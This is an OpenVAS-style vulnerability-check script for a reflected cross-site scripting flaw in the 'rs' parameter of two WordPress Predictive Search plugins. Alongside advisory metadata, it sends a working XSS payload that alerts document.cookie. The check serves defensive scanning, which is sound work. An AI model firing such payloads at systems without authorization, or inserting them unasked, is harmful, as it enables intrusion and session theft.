CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803072" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_bugtraq_id( 56702, 56703 );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2012-12-10 13:35:37 +0530 (Mon, 10 Dec 2012)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "WordPress WP e-Commerce And WooCommerce Predictive Search Plugin 'rs' XSS Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/51385" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/51384/" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/80382" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/80383" );
	script_xref( name: "URL", value: "http://www.securelist.com/en/advisories/51384" );
	script_xref( name: "URL", value: "http://www.securelist.com/en/advisories/51385" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to insert arbitrary HTML and
  script code, which will be executed in a user's browser session in the
  context of an affected site when the malicious data is being viewed." );
	script_tag( name: "affected", value: "WordPress WooCommerce Predictive Search Plugin version 1.0.5 and prior

  WordPress WP e-Commerce Predictive Search plugin version 1.1.1 and prior" );
	script_tag( name: "insight", value: "Input passed via the 'rs' parameter to index.php
  (when page_id is set to the predictive search page) is not properly
  sanitised before it is returned to the user." );
	script_tag( name: "summary", value: "This host is running WordPress WP e-Commerce or WooCommerce Predictive
  Search Plugins and is prone to cross site scripting vulnerability." );
	script_tag( name: "solution", value: "Update to the WordPress WooCommerce Predictive Search Plugin version 1.0.6 or later, upgrade to the WordPress WP e-Commerce Predictive Search Plugin version 1.1.2 or later." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/woocommerce-predictive-search/" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/wp-e-commerce-predictive-search/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
for pageid in make_list( "4",
	 "5" ) {
	url = dir + "/?page_id=" + pageid + "&rs=><script>alert(document.cookie)</script>";
	if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>", extra_check: "Predictive Search" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

